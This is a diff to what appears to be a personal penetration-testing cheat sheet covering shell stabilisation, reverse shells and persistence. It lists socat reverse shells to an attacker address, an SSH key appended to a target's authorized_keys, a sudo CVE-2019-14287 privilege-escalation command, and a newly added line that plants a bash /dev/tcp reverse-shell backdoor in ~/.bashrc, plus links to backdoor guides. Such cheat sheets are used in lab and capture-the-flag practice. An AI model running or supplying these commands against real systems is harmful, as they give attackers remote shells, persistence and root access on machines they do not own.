@@ -3,7 +3,6 @@
 /bin/bash -ip
 perl -e 'exec "/bin/bash";'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-
 -----------------
 CTRL + Z
 stty raw -echo;fg
@@ -15,13 +14,15 @@ stty rows 52 columns 209
 socat TCP-L:<port> # in our system
 socat TCP-L:<port> FILE:`tty`,raw,echo=0  # in our system
 
-socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" # in our system for linux
-socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes # in our system for windows
+socat TCP:<local-ip>:<local-port> EXEC:"bash -li" # in our system for linux
+socat TCP:<local-ip>:<local-port> EXEC:powershell.exe,pipes # in our system for windows
 
 socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane # in target system
 -----------------
 ssh user@10.10.10.10 -i id_rsa  # in our system 
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGQvOtGg1iFei0La62IoJcnK+JxlCF/E9XRRbox86Ufk mobin@solcoteh' >> /home/user/.ssh/authorized_keys # in target
+-----------------
+echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> ~/.bashrc # backdoor in target
 -----------------
 sudo -u#-1 /bin/bash # CVE-2019-14287
 sudo -u silvio /usr/bin/zip # run with another user
@@ -34,6 +35,8 @@ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lo
 [full-ttys](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/full-ttys)
 
 [spawning-tty-shells](https://hideandsec.sh/books/cheatsheets-82c/page/spawning-tty-shells)
+
+[9-ways-to-backdoor-a-linux-box](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c)
 
 [upgrading-simple-shells-to-fully-interactive-ttys](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys)
 
